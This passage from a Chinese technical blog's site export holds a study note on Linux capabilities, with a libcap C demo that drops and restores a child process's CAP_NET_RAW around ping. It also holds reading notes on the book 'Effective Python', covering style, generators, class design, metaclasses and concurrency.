/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/chsh /usr/bin/newgrp /usr/bin/arping /usr/bin/traceroute6.iputils /usr/bin/gpasswd /usr/bin/chfn /usr/bin/passwd /usr/bin/pkexec /usr/bin/sudo 权能 在早先的Linux系统中，执行特权操作的时候，内核对于有效的user ID为0 （超级用户root）的时候不进行检查，而对user ID非0的情况进行许可检查。主要是effective UID、effective GID。 Linux 2.2起，Linux有了权能的概念。当执行特权操作的时候，可以查看是否有相应的权能。 权能可以让普通用户完成超级用户可以做的事情。 继续上一个例子 在上一个例子中，我们把setuid位取消了，然后发现ping命令不行了，现在我们用setcap赋予cap_new_raw的权能： 发现可以Ping！并且没有setuid位！ 权能的作用 权能相当于规范了你这个程序所拥有的权限。相当于特权的需求的细化。 比如ping命令需要有socket的连接，需要CAP_NET_RAW的权能，其说明如下： CAP_NET_RAW Use RAW and PACKET sockets; bind to any address for transparent proxying. 现在linux的权能有好多，可以见man手册 上面打印出了那么多的setuid位的程序，比如ping 只需要CAP_NET_RAW权能即可 其它部分需要的权能如下： 程序 需要的权能 /bin/ping CAP_NET_RAW /bin/mount CAP_SYS_ADMIN /bin/su CAP_DAC_OVERRIDE,CAP_SETGID,CAP_SETUID /bin/fusermount CAP_SYS_ADMIN /bin/umount CAP_SYS_ADMIN /usr/bin/passwd CAP_CHOWN ,CAP_DAC_OVERRIDE ,CAP_FOWNER 权能三项与权能变换 在linux中，权能有如下三种： effective：当前有效的权能，执行某特权操作时，操作系统检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。 permitted：当前进程所有能使用的能力，effective包含于permitted inheritable：可以被继承的能力 上面我们设置ping的权能就是设置了effective和permitted。 linux程序可以调用子程序，其权能变换如下： During an execve, the kernel calculates the new capabilities of the process using the following algorithm: 123P&#39;(permitted) &#x3D; (P(inheritable) &amp; F(inheritable)) (F(permitted) &amp; cap_bset)P&#39;(effective) &#x3D; F(effective) ? P&#39;(permitted) : 0P&#39;(inheritable) &#x3D; P(inheritable) P：denotes the value of a thread capability set before the execve(2) P'：denotes the value of a capability set after the execve(2) F：denotes a file capability set cap_bset：is the value of the capability bounding set (described below). 权能变换小程序 实现一个程序其满足以下的功能： 能够永久的删除其子进程的某个权能。 能暂时性的删除其子进程的某个权能。 能让上面被暂时性删除的权能重新获得 以ping为例，我们知道ping需要的权能为cap_net_raw，为了能在execve后执行ping，即execve中的ping有cap_net_raw权能，根据上面的变换规则： 设置/bin/ping权能为cap_net_raw+ei，使得可以继承 sudo setcap cap_net_raw+ei /bin/ping 设置当前的进程的权能有cap_net_raw+i权能 此外，我们的程序先进行fork()，在子进程中调用execve执行ping，因为不用fork执行ping后会退出程序。 fork()创建子进程,那么子进程继承父进程的所有能力，因此没必要重新设置fork后的权能。 为了让有更改权能的能力，首先以sudo运行程序，赋予 CAP_SETUID, CAP_SETGID, CAP_SETPCAP权能，然后setuid和gid为1000。 永久删除子进程的权能就移除effective和inheritable、permitted的，暂时性删除就移除effective和inheritable的，恢复暂时性删除的就添加进effective和inheritable。 下面的代码需要安装libcap sudo apt-get install libcap-dev PS: 这个实验的系统环境为：Linux version 4.8.0-45-generic (buildd@lcy01-25) (gcc version 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12) ) #48-Ubuntu SMP Fri Mar 24 11:44:57 UTC 2017 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/capability.h&gt;#include &lt;sys/prctl.h&gt;#undef _POSIX_SOURCEextern int errno;void whoami() &#123; printf(&quot;uid=%i euid=%i gid=%i\\n&quot;, getuid(), geteuid(), getgid());&#125;void listCaps()&#123; cap_t caps = cap_get_proc(); ssize_t y = 0; printf(&quot;The Process %d was give capabilities %s\\n&quot;,(int) getpid(), cap_to_text(caps, &amp;y)); fflush(0); cap_free(caps);&#125;void do_ping()&#123; if(!fork())&#123; whoami(); listCaps(); execlp(&quot;ping&quot;,&quot;ping&quot;,&quot;-c 1&quot;,&quot;baidu.com&quot;,NULL); &#125;&#125;void init()&#123; if(getuid() != 0)&#123; puts(&quot;请使用sudo执行本程序&quot;); exit(1); &#125; cap_value_t cap_values[] = &#123;CAP_SETUID, CAP_SETGID, CAP_SETPCAP ,CAP_NET_RAW&#125;; cap_t caps = cap_init(); cap_set_flag(caps, CAP_PERMITTED, 4, cap_values, CAP_SET); cap_set_flag(caps, CAP_EFFECTIVE, 4, cap_values, CAP_SET); cap_set_proc(caps); prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0); cap_free(caps); setgid(1000); setuid(1000); caps = cap_get_proc(); cap_set_flag(caps, CAP_EFFECTIVE, 4, cap_values, CAP_SET); cap_set_flag(caps, CAP_INHERITABLE, 4, cap_values, CAP_SET); cap_set_proc(caps); cap_free(caps); whoami(); listCaps();&#125;void printInfo()&#123; puts(&quot;\\n------权能测试小程序------\\n\\请输入如下字符:\\n\\1 : 永久的删除其子进程的某个权能\\n\\2 : 暂时性的删除其子进程的某个权能\\n\\3 : 暂时性删除的权能重新获得\\n\\4 : ping -c 1 baidu.com\\n\\5 : 查看当前权能\\n\\q : 退出\\n\\---------------------------\\n&quot;);&#125;int main(int argc, char **argv)&#123; init(); char line[128]; printInfo(); while(fgets(line, sizeof(line), stdin))&#123; char cmd = line[0]; if(cmd == &#x27;1&#x27; || cmd == &#x27;2&#x27; || cmd == &#x27;3&#x27;)&#123; printf(&quot;输入要操作的权能名，如cap_net_raw\\n&quot;); fgets(line, sizeof(line), stdin); line[strlen(line) - 1] = &#x27;\\0&#x27;; cap_value_t temp; if(cap_from_name(line, &amp;temp) &lt; 0)&#123; printf(&quot;Error capability name\\n&quot;); &#125; else&#123; cap_t caps = cap_get_proc(); if(cmd == &#x27;3&#x27;)&#123; cap_set_flag(caps, CAP_EFFECTIVE, 1, &amp;temp, CAP_SET); cap_set_flag(caps, CAP_INHERITABLE, 1, &amp;temp, CAP_SET); &#125; else&#123; cap_set_flag(caps, CAP_EFFECTIVE, 1, &amp;temp, CAP_CLEAR); cap_set_flag(caps, CAP_INHERITABLE, 1, &amp;temp, CAP_CLEAR); if(cmd == &#x27;1&#x27;) cap_set_flag(caps, CAP_PERMITTED, 1, &amp;temp, CAP_CLEAR); &#125; if(cap_set_proc(caps)) perror(&quot;cap_set_proc() ERROR: &quot;); else printf(&quot;%s %s success\\n&quot;, (cmd ==&#x27;3&#x27;? &quot;recover&quot;:&quot;remove&quot;),line); cap_free(caps); &#125; &#125; else if(cmd == &#x27;4&#x27;) do_ping(); else if(cmd == &#x27;5&#x27;) listCaps(); else if(cmd == &#x27;q&#x27;) break; printInfo(); &#125; return 0;&#125; 小程序测试 gcc test_capability.c -lcap sudo ./a.out 一开始是可以ping的 暂时删除cap_net_raw后不能ping 恢复后又能ping 永久删除后不能ping 注意观察上面打印出的fork后子进程的权能变化。 参考资料 man capabilities Linux的capability深入分析","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"信息安全","slug":"study/信息安全","permalink":"https://www.hrwhisper.me/categories/study/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.hrwhisper.me/tags/Ubuntu/"}]},{"title":"Effective Python 笔记","slug":"note-for-effective-python","date":"2017-04-23T06:33:11.000Z","updated":"2021-01-08T13:42:14.071Z","comments":true,"path":"note-for-effective-python/","link":"","permalink":"https://www.hrwhisper.me/note-for-effective-python/","excerpt":"《Effective Python》的读书笔记~","text":"《Effective Python》的读书笔记~ Pythonic Thinking Python开发者用Pythonic这个形容词来形容那种符合特定风格的代码。 用import this 可以以查看python的编程之禅 PEP8风格指南 针对Python代码格式编订的风格指南 空白Whitespace 使用空格而不是制表符来缩进 和语法相关的为4个空格 每行字符不超过79 对于多行的长表达式，除首行外其余各行都应该在通常缩进级别之上再加4个空格 文件中的函数与类之间应该用两个空行隔开 在同一个类中，各方法之间用一个空行隔开 对于下表取值、函数调用、给关键字参数赋值不要在两旁写空格 变量赋值时赋值符号各自写一个空格 命名 函数、变量和属性用小写+下划线的形式 受保护的实例属性用单下划线开头_leading_underscore 私有的实例属性用两个下划线开头__double_leading_underscore 类和异常每个单词首字母均大写 CapitalizedWord 模块级别的常量全部大写+下划线：ALL_CAPS 类中的实例方法首个参数命名为self，表示对象本身 类方法class method首个参数应该用cls，表示该类自身 表达式和语句 使用(if a is not b)而不是if not a is b 不要通过长度检测 if len(somelist) == 0 来判断是否为空，直接用if not somelist这种方式来判断，空值默认判断为False 检测somelist是否为[1]或'hi'等非空值，也应该直接用if somelist，会把非空为True 避免单行的if 、for、while循环以及except复合语句，应该拆分为多行使得更加清晰 import 语句总是放在文件的开头 引入模块应该才用绝对的路径而不要用相对的路径，如引入bar中的foo，import bar import foo，而不是import foo 如果一定要相对名称，就用明确的写法：from . import foo import语句应该按顺序分为三部分：标准库模块、第三方模块、自用模块。每一部分中，各import语句按模块的字母顺序排列 其它 在同一个切片操作内，不要同时使用start、end、stride，如果确实需要执行这样的语句，那就考虑将其拆解为两条赋值语句，其中一条作范围切割，另一条做步进切割。如果对时间或者内存要求严格，可以考虑内置itertools中的islice a = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'] a[::2] # ['a', 'c', 'e', 'g'] a[::-2] # ['h', 'f', 'd', 'b'] 下面的会让人困惑 a[2::2] # ['c', 'e', 'g'] a[-2::-2] # ['g', 'e', 'c', 'a'] a[-2:2:-2] # ['g', 'e'],从-2开始取到下标为2，且步长为2 a[2:2:-2] # [] 不要使用含有两个以上的列表推导，因为难以理解 使用生成器表达式来改写数据量较大的列表推导 把实现列表推导的[]改为()就变成了生成器表达式 数据量大用列表推导占用太多内存（内存不一定够） 串在一起的生成器表达式执行速度很快 it = (len(x) for x in open('/tmp/my_file.txt')) roots = ((x, x**0.5) for x in it) 尽量用enurmate取代range 用zip来平行的遍历多个迭代器 python3中zip相当于生成器。 如果迭代器长度不等，那么zip会提前自动终止。 使用zip_longest可以平行遍历多个迭代器 不要在for 和 while后写else块 容易让人误解 只有当整个循环都没有break的时候，循环后面的else才会执行 合理利用try/except/else/finally中的每个代码块 无论try块是否发生异常，都可以用finally来执行清理工作 else 可以用来缩减try块中的代码量，并把没有发生异常时所要执行的语句和try/except代码块隔开 函数 在闭包中使用外围作用域的变量 若是当前作用域没有这个变量，python会把这次赋值视为对变量的定义 使用nonlocal来修改外围作用域中同名变量，但不能延伸到模块级别，防止污染全局作用域 nonlocal与global互为补充，会直接修改模块作用域里的那个变量 生成器 生成器是使用yield的函数，调用生成器函数时，并不会真的执行，而是会返回生成器。每个在这个迭代器上面调用next函数时，迭代器把生成器推进到下一个yield表达式那里 当函数参数若是迭代器… 需要注意的时，迭代器只能返回一轮结果，在跑出过StopIteration异常的迭代器或生成器上继续迭代第二轮是不会有结果的。因此，如果将迭代器作为参数并在函数中想要遍历两次，那么代码不能按我们期望的方式进行。 解决的办法是新编一种实现迭代器协议的容器类。 python在for循环及相关表达式中遍历某种容器的内容时，就要依靠这个迭代器协议。在执行类似for x in foo这样的语句时，python实际上会调用iter(foo)，iter又会调用foo.__iter__这个方法。这个方法返回迭代器对象，而那个迭代器本身，实现了__next__特殊方法，此后for循环在迭代器上反复调用next函数，直到耗尽并产生stopIteration异常。 在使用类时，只需要令自己的类把__iter__方法实现为生成器就可以实现上面的要求 1234567class ReadVisits(object): def __init__(self, data_path): self.data_path = data_path def __iter__(self): with open(self.data_path) as f: for line in f: yield int(line) 想判断某个值是容器还是迭代器，可以拿该值为参数，两次调用iter函数。若结果,相同，则为迭代器if iter(numbers) is iter(numbers) 变长参数 变长参数在传给函数时，总是要先转化为元祖，因此，若对生成器使用*操作符，就会将生成器完整迭代一轮，并把结果每个值都放入元祖中，这可能会消耗大量内存，导致程序崩溃。 使用*arg参数的第二个问题是将来要给函数添加新的位置参数，就必须修改原来调用函数的代码。为了避免此情况，我们应该使用只以关键字形式指定的参数来扩展接受*args的函数 关键字参数 位置参数必须出现在关键字参数之前 如这样是错的：remainder(number=20, 7) 动态默认值的参数应该把形式上的默认值写成None，然后在函数中初始化。因为参数的默认值会在每个模块加载进来的时候求出，而很多模块都在程序启动时加载。模块一旦加载进来，参数默认固定值就不变。 如下代码的when不会变 12def log(message, when=datetime.now()): print(‘%s: %s’ % (when, message)) **参数列表里的*号，标志着位置参数就此终结，之后的参数只能以关键字形式来指定**（only py3） 123def safe_division_c(number, divisor, *, ignore_overflow=False, ignore_zero_division=False): 类和继承 namedtuple 如果容器中包含简单又不可变的数据，那么先用namedtuple来表示，稍后有需要的时候再修改为完整的类。 不过无法指定默认参数 使用例子： 1234Point = collections.namedtuple(&#x27;Point&#x27;, [&#x27;x&#x27;, &#x27;y&#x27;])p = Point(11, y=22)print(p[0] + p[1]) # 33print(p.x + p.y) # 33 简单的接口应该接受函数而非类的实例 对于连接各种Python的简单接口，通常应该给其直接传入函数，而不是先定义某个类，然后再传入这个类的实例。 python中的函数和方法都可以像一级类那样引用。 python中的函数之所以能充当挂钩，原因在于函数是一级对象,可以像语言中其它值那样传递和引用。 nums.sort(key=lambda x:len(x)) 通过名为__call__的方法，可以使类的实例能像普通的python函数那样得到调用。 如果要用函数来保存状态，那么就定义新的类，并实现__call__方法，而不是定义带状态的闭包。 @classmethod来多态构建对象 python只允许__init__的构造器方法，可以使用@classmethod的多态。 12345def create_workers(input_list): workers = [] for input_data in input_list: workers.append(LineCountWorker(input_data)) return workers 上面的例子中， LineCountWorker为Worker的子类。 假如此时需要处理别的work的话，那就得重写这个函数。 因此可以这样： 1234567891011121314class GenericWorker(object):# … def map(self): raise NotImplementedError def reduce(self, other): raise NotImplementedError @classmethod def create_workers(cls, input_class, config): workers = [] for input_data in input_class.generate_inputs(config): workers.append(cls(input_data)) return workers 然后让具体的子类继承GenericWorker即可。 用super初始化父类 钻石形继承体系： 123456789101112131415161718192021class MyBaseClass(object): def __init__(self, value): self.value = valueclass TimesFive(MyBaseClass): def __init__(self, value): MyBaseClass.__init__(self, value) self.value *= 5class PlusTwo(MyBaseClass): def __init__(self, value): MyBaseClass.__init__(self, value) self.value += 2class ThisWay(TimesFive, PlusTwo): def __init__(self, value): TimesFive.__init__(self, value) PlusTwo.__init__(self, value)foo = ThisWay(5)print(foo.value) # 7 want to 5 * 5 + 2 = 27 用super的话，钻石顶部的MyBaseClass类中的__init__方法只会运行一次。而其它超类初始化顺序，则与这些超类在class语句中出现的顺序相同。 1234567891011121314151617181920212223class MyBaseClass(object): def __init__(self, value): self.value = valueclass TimesFive(MyBaseClass): def __init__(self, value): super().__init__(value) self.value *= 5class PlusTwo(MyBaseClass): def __init__(self, value): super().__init__(value) self.value += 2class GoodWay(TimesFive, PlusTwo): def __init__(self, value): super().__init__(value) super().__init__(value)foo = GoodWay(5)print(foo.value) # 35print(GoodWay.mro()) # [&lt;class &#x27;__main__.GoodWay&#x27;&gt;, &lt;class &#x27;__main__.TimesFive&#x27;&gt;, &lt;class &#x27;__main__.PlusTwo&#x27;&gt;, &lt;class &#x27;__main__.MyBaseClass&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;] 可以用mro类方法查询程序的运行顺序，调用GoodWay(5)，首先调用TimesFive.__init__，然后TimesFive.__init__调用PlusTwo.__init__，然后PlusTwo.__init__调用MyBaseClass.__init__，到达顶部后，先设为5，然后PlusTwo.__init__加2，然后TimesFive.__init__乘以5，得到了35。 只在使用Mix-in组件制作工具类时进行多重继承 Mix-in可以认为是工具类，继承的子类便具有了这些功能,子类可以复写方法来改进。能用Mix-in组件实现的效果，就不要用多重继承来做。 1234567891011121314151617181920212223242526272829303132class ToDictMixin(object): def to_dict(self): return self._traverse_dict(self.__dict__) def _traverse_dict(self, instance_dict): output = &#123;&#125; for key, value in instance_dict.items(): output[key] = self._traverse(key, value) return output def _traverse(self, key, value): if isinstance(value, ToDictMixin): return value.to_dict() elif isinstance(value, dict): return self._traverse_dict(value) elif isinstance(value, list): return [self._traverse(key, i) for i in value] elif hasattr(value, &#x27;__dict__&#x27;): return self._traverse_dict(value.__dict__) else: return valueclass BinaryTree(ToDictMixin): def __init__(self, value, left=None, right=None): self.value = value self.left = left self.right = righttree = BinaryTree(10, left=BinaryTree(7, right=BinaryTree(9)), right=BinaryTree(13, left=BinaryTree(11)))print(tree.to_dict()) 多用public属性，少用private属性 子类无法访问private属性，原因在于变换后的属性名和待访问的属性名称不相符： 1234567891011class MyParentObject(object): def __init__(self): self.__private_field = 71class MyChildObject(MyParentObject): def get_private_field(self): return self.__private_fieldbaz = MyChildObject()baz.get_private_field()# AttributeError: &#x27;MyChildObject&#x27; object has no attribute &#x27;_MyChildObject__private_field&#x27; 调用MyChildObject.get_private_field，它将translates __private_field变换为_MyChildObject__private_field，然后进行访问。而__private_field只在MyParentObject.__init__做了定义，因此这个私有属性的名称是_MyParentObject__private_field。 因此，上面的代码可以直接用print(baz._MyParentObject__private_field)#71 访问私有属性。 Python编译器无法严格保证private字段的私密性。宁可叫子类更多地取访问超类的protected属性，也不要设置为private。应当在文档中说明每个protected字段的含义，解释哪些字段是可供子类使用的内部API，哪些字段是完全不应该触碰的数据。 只有当子类不受自己控制的时候，才可以考虑用private属性来避免名称冲突。 继承collecions.abc实现自定义容器类型 如果要定制的子类比较简单，可以直接从Python的容器类型继承（如List或dict） 编写自制的容器类型，可以从collections.abc模块的抽象基类中继承，那些基类能确保我们子类具备适当的接口及行为。如继承Sequence的话，要求实现__getitem__以及__len__方法 元类及属性 元类这个词只是模糊的描述了一种高于类又超乎类的概念。就是我们可以把python的class语句转译为元类，并令其在每次定义具体的类时，都提供独特的行为。 python还可以动态的定义对属性的访问操作。 用@property取代get和set方法 如果访问对象的某个属性，需要表现出特殊的行为（如修改电压同时修改电流），可以用@property来修饰方法 setter和getter的名称必须要相关属性相符 可以在setter的时候设置相关的属性，或者进行数值验证 @property方法需要执行得迅速一点，缓慢或复杂的工作应该放在普通方法里 12345678910111213141516171819202122class Resistor(object): def __init__(self, ohms): self.ohms = ohms self.voltage = 0 self.current = 0class BoundedResistance(Resistor): def __init__(self, ohms): super().__init__(ohms) @property def ohms(self): return self._ohms @ohms.setter def ohms(self, ohms): if ohms &lt;= 0: raise ValueError(&#x27;%f ohms must be &gt; 0&#x27; % ohms) self._ohms = ohmsr3 = BoundedResistance(1e3) # 1e3改成0也会ValueErrorr3.ohms = 0 # raise ValueError(&#x27;%f ohms must be &gt; 0&#x27; % ohms) 用@property代替属性重构 @property可以把一个原有的属性变为新的。 如下面的例子中，原来的属性有quota，现在改成了max_quota和quota_consumed： 1234567891011121314151617class Bucket(object): def __init__(self, period): self.period_delta = timedelta(seconds=period) self.reset_time = datetime.now() self.max_quota = 0 self.quota_consumed = 0 def __repr__(self): return (&#x27;Bucket(max_quota=%d, quota_consumed=%d)&#x27; % (self.max_quota, self.quota_consumed)) @property def quota(self): return self.max_quota - self.quota_consumed @quota.setter def quota(self, amount): # ... 如果@property用得太过频繁，那么就应该考虑彻底重构该类并修改相关的调用代码。 用 getattr、 getattribute、和__setattr__ 实现按需生成的属性 如果某个类定义了__getattr__，系统在该类对象实例的字典中又找不到待查询的属性，那么系统就会调用这个方法。适合实现按需访问，初次执行__getattr__把相关属性加载，以后在访问该属性时，只需从现有的结果中获取即可。 12345678910111213class LazyDB(object): def __init__(self): self.exists = 5 def __getattr__(self, name): value = &#x27;Value for %s&#x27; % name setattr(self, name, value) return valuedata = LazyDB()print(&#x27;Before:&#x27;, data.__dict__) # Before: &#123;&#x27;exists&#x27;: 5&#125;print(&#x27;foo: &#x27;, data.foo) # foo: Value for fooprint(&#x27;After: &#x27;, data.__dict__) # After: &#123;&#x27;foo&#x27;: &#x27;Value for foo&#x27;, &#x27;exists&#x27;: 5&#125; __getattribute__方法：每次访问对象属性时，都会调用这个方法（即使属性字典有也会） __setattr__：赋值操作时均会触发（无论是内置的setattr函数还是直接赋值） 如果要在__getattribute__和__setattr__中访问实例属性，那么应该直接通过super()来避免无限递归： 12345678910class BrokenDictionaryDB(object): def __init__(self, data): self._data = data def __getattribute__(self, name): print(&#x27;Called __getattribute__(%s)&#x27; % name) return self._data[name]data = BrokenDictionaryDB(&#123;&#x27;foo&#x27;: 3&#125;)data.foo 这样才是对的 12345678910class BrokenDictionaryDB(object): def __init__(self, data): self._data = data def __getattribute__(self, name): _data = super().__getattribute__(&#x27;_data&#x27;) return _data[name]data = BrokenDictionaryDB(&#123;&#x27;foo&#x27;: 3&#125;)print(data.foo) 用元类验证子类 定义元类的时候，要从type中继承。 对于使用该元类的其他类，python会把那些类的class语句体中所含的相关内容，发送给元类的__new__方法。于是我们可以在系统构建出那个类之前，先修改类的信息。 1234567891011121314class Meta(type): def __new__(mcs, *args, **kwargs): print(args) # name,base,class_dict return type.__new__(mcs, *args, **kwargs)class MyClass(object, metaclass=Meta): stuff = 123 def foo(self): passMyClass()# (&#x27;MyClass&#x27;, (&lt;class &#x27;object&#x27;&gt;,), # &#123;&#x27;stuff&#x27;: 123, &#x27;__qualname__&#x27;: &#x27;MyClass&#x27;, &#x27;__module__&#x27;: &#x27;__main__&#x27;, &#x27;foo&#x27;: &lt;function MyClass.foo at 0x00000140C57518C8&gt;&#125;) 通过元类，我们可以在生成子类对象之前，先验证子类的定义是否合乎规范。 python把子类的整个class语句处理完后，就调用其元类的__new__方法。 如下面的例子中，多边形至少三条边，而Line设置一条边就不行： 123456789101112131415161718class ValidatePolygon(type): def __new__(mcs, *args, **kwargs): # Don&#x27;t validate the abstract Polygon class name, bases, class_dict = args if bases != (object,): if class_dict[&#x27;sides&#x27;] &lt; 3: raise ValueError(&#x27;Polygons need 3+ sides&#x27;) return type.__new__(mcs, *args, **kwargs)class Polygon(object, metaclass=ValidatePolygon): sides = None # Specified by subclasses @classmethod def interior_angles(cls): return (cls.sides - 2) * 180class Line(Polygon): sides = 1 # raise ValueError(&#x27;Polygons need 3+ sides&#x27;) 用元类注解类的属性 用下面的代码将数据库的行和列建立对应关系： 123456789101112131415161718class Field(object): def __init__(self, name): self.name = name self.internal_name = &#x27;_&#x27; + self.name def __get__(self, instance, instance_type): if instance is None: return self return getattr(instance, self.internal_name, &#x27;&#x27;) def __set__(self, instance, value): setattr(instance, self.internal_name, value)class Customer(object): first_name = Field(&#x27;first_name&#x27;) last_name = Field(&#x27;last_name&#x27;) prefix = Field(&#x27;prefix&#x27;)suffix = Field(&#x27;suffix&#x27;) 但是Field还需要指定字段名称如first_name = Field('first_name')，比较繁琐，可以用元类来做 12345678910111213141516171819202122232425262728293031323334353637class Field(object): def __init__(self): self.name = None self.internal_name = None # &#x27;_&#x27; + self.name def __get__(self, instance, instance_type): if instance is None: return self return getattr(instance, self.internal_name, &#x27;&#x27;) def __set__(self, instance, value): setattr(instance, self.internal_name, value)class Meta(type): def __new__(mcs, *args, **kwargs): for key, value in args[2].items(): if isinstance(value, Field): value.name = key value.internal_name = &#x27;_&#x27; + key return type.__new__(mcs, *args, **kwargs)class DatabaseRow(object, metaclass=Meta): passclass BetterCustomer(DatabaseRow): first_name = Field() last_name = Field() prefix = Field() suffix = Field()foo = BetterCustomer()print(&#x27;Before:&#x27;, repr(foo.first_name), foo.__dict__)# Before: &#x27;&#x27; &#123;&#125;foo.first_name = &#x27;Euler&#x27;print(&#x27;After: &#x27;, repr(foo.first_name), foo.__dict__)# After: &#x27;Euler&#x27; &#123;&#x27;_first_name&#x27;: &#x27;Euler&#x27;&#125; 并发及并行 用subprocess来管理子进程 1234roc = subprocess.Popen([&#x27;ping&#x27;, &#x27;baidu.com&#x27;], stdout=subprocess.PIPE)out, err = proc.communicate()out = subprocess.check_output([&#x27;ping&#x27;, &#x27;baidu.com&#x27;], stderr=subprocess.STDOUT) 可以一边定期查询子进程状态，一遍处理其它事务 12345678910roc = subprocess.Popen([&#x27;ping&#x27;, &#x27;baidu.com&#x27;], stdout=subprocess.PIPE)out, err = proc.communicate()out = subprocess.check_output([&#x27;ping&#x27;, &#x27;baidu.com&#x27;], stderr=subprocess.STDOUT)proc = subprocess.Popen([&#x27;sleep&#x27;, &#x27;0.3&#x27;], stdout=subprocess.PIPE)while proc.poll() is None: print(&quot;working&quot;) # some time-consuming workprint(&#x27;Exit status&#x27;, proc.poll()) 还可以给 communicate传入timeout参数，避免子进程死锁或挂起 python线程并非并行 标准的python实现叫做CPython，CPython分两步来运行Python程序。首先把文本形式的源代码解析并编译成字节码。然后，用一种基于栈的解释器来运行这份字节码。执行python程序时，字节码解释器必须保持协调一致的状态。Python才用GIL（global interpreter lock，全局解释器锁）来确保这种协调性。 GIL为一把互斥锁，用以防止Cpython收到抢占式多线程切换的干扰。由于收到GIL保护，同一时刻只有一条线程向前执行。（虽然同一时刻只有一条线程，但仍需锁等机制来防止数据竞争） 可以用concurrent.futures中的ProcessPoolExecutor来执行真正的并行。 子进程的GIL是独立的 原理：将数据通过pickle来执行序列化，变为二进制形式，然后用local socket发给子解释器，子进程用pickle反序列化操作，然后执行。将结果进行序列化操作，然后用socket发送回主进程。主进程反序列化得到结果。主进程和子进程之间，必须进行序列化和反序列化操作，开销较大。 官方注释如下: 123456789101112131415161718|======================= In-process =====================|== Out-of-process ==|+----------+ +----------+ +--------+ +-----------+ +---------+| | =&gt; | Work Ids | =&gt; | | =&gt; | Call Q | =&gt; | || | +----------+ | | +-----------+ | || | | ... | | | | ... | | || | | 6 | | | | 5, call() | | || | | 7 | | | | ... | | || Process | | ... | | Local | +-----------+ | Process || Pool | +----------+ | Worker | | #1..n || Executor | | Thread | | || | +----------- + | | +-----------+ | || | &lt;=&gt; | Work Items | &lt;=&gt; | | &lt;= | Result Q | &lt;= | || | +------------+ | | +-----------+ | || | | 6: call() | | | | ... | | || | | future | | | | 4, result | | || | | ... | | | | 3, except | | |+----------+ +------------+ +--------+ +-----------+ +---------+ Queue(queue中) 为线程安全 具备阻塞式队列操作 指定缓冲区尺寸 join等 协程 线程有三个显著的缺点： 需要特殊的工具来保证数据的安全。于是多线程的代码更加难懂，不便于扩展维护。 线程需占用大量内存，每个线程大约需要8MB。如果程序中运行成千上万个函数并且想要用线程来模拟出同时运行的效果，那就会出现问题。 线程启动开销比较大。 Python中的协程可以解决上述的问题。协程，又称微线程，纤程。英文名Coroutine。协程可以理解为用户级线程，协程和线程的区别是：线程是抢占式的调度，而协程是协同式的调度，协程避免了无意义的调度，由此可以提高性能，但也因此，程序员必须自己承担调度的责任，同时，协程也失去了标准线程使用多CPU的能力。 Python协程的工作原理是：通过send给生成器传值，生成器将yield作为表达式的执行结果。执行完当前的yield，生成器推进到下一个yield表达式那里，并将那个yield关键字右侧的内容，当成send方法的返回值，返回给外界。 生成器通过这个输出值，来推进其他的生成器函数，使得那些生成器函数也执行到它们各自的下一条yield表达式处。接连推进多个独立的生成器，可以模拟出python线程的并发行为，令程序真正看上去好像是在同时执行多个函数。（用yield from 推进其他的生成器） 下面的代码中统计当前的最小值统计当前的最小值： 123456789101112def minimize(): current = yield while True: value = yield current current = min(value, current)it = minimize()next(it) # Prime the generatorprint(it.send(10)) # 10print(it.send(4)) # 4print(it.send(22)) # 4print(it.send(-1)) # -1 内置模块 装饰器 contextlib和with语句改写try/finally语句 with open('./data') as f: 比使用try 打开文件然后finally中关闭好得多 一个简单的函数，只需要经过contextlib中的contextmanager修饰，就可以用在with语句中。 由于py的默认信息级别是WARNING，因此不会打印debug的(只会打印不小于当前级别的)。下面用一个经过contextmanager修饰的函数来临时提升信息的级别，执行完毕后，再恢复原有级别。yield表达式所在的地方，就是with语句中要执行的地方。 123456789101112131415161718192021def my_function(): logging.debug(&#x27;Some debug data&#x27;) logging.error(&#x27;Error log here&#x27;) logging.debug(&#x27;More debug data&#x27;)@contextmanagerdef debug_logging(level): logger = logging.getLogger() old_level = logger.getEffectiveLevel() logger.setLevel(level) try: yield finally: logger.setLevel(old_level)with debug_logging(logging.DEBUG): logging.warning(&#x27;Inside: &#x27;) my_function()logging.warning(&#x27;After: &#x27;)my_function() 如果yield返回一个值，那么此值会赋值给由as关键字所指定的变量。 用copyreg实现可靠的pickle操作 pickle处理之后的数据，不一种不安全的格式。如果混入了恶意信息，那么python程序对其进行反序列化操作的时候，这些恶意信息可能对程序照成伤害。 json模块产生的则是一种安全的格式。 可以把内置的copyreg和pickle结合起来使用，以便为旧数据添加缺失的属性值、进行类的版本管理，并给序列化后的数据提供固定的引入路径。 用datetime模块来处理本地时间，而非time模块 time模块需要依赖操作系统而运作。不要用time模块在不同的时区之间进行转换。 如果要在不同时区之间，进行可靠的转换，应该把内置的datetime模块与开发者社区提供的pytz模块搭配起来使用。 先把时间转换成UTC格式，然后执行各种转换操作，最后再转换回本地时间。 使用内置的算法和数据结构 deque 双向队列 append popleft pop OrderedDict 有序字典 heapq 堆 bisect_left 二分查找 和迭代器有关的： 把迭代器连接起来： chain: 将多个迭代器按顺序连成一个迭代器 cycle无限重复某个迭代器中各个元素 tee 把一个迭代器拆分成多个平行的迭代器 zip_longest：和zip类似，但可以应对长度不同的迭代器 能够从迭代器中过滤元素的函数 islice：不进行赋值的前提下，根据索引值来切割迭代器 takewhile：再判定函数为True的时候，从迭代器中逐个返回元素 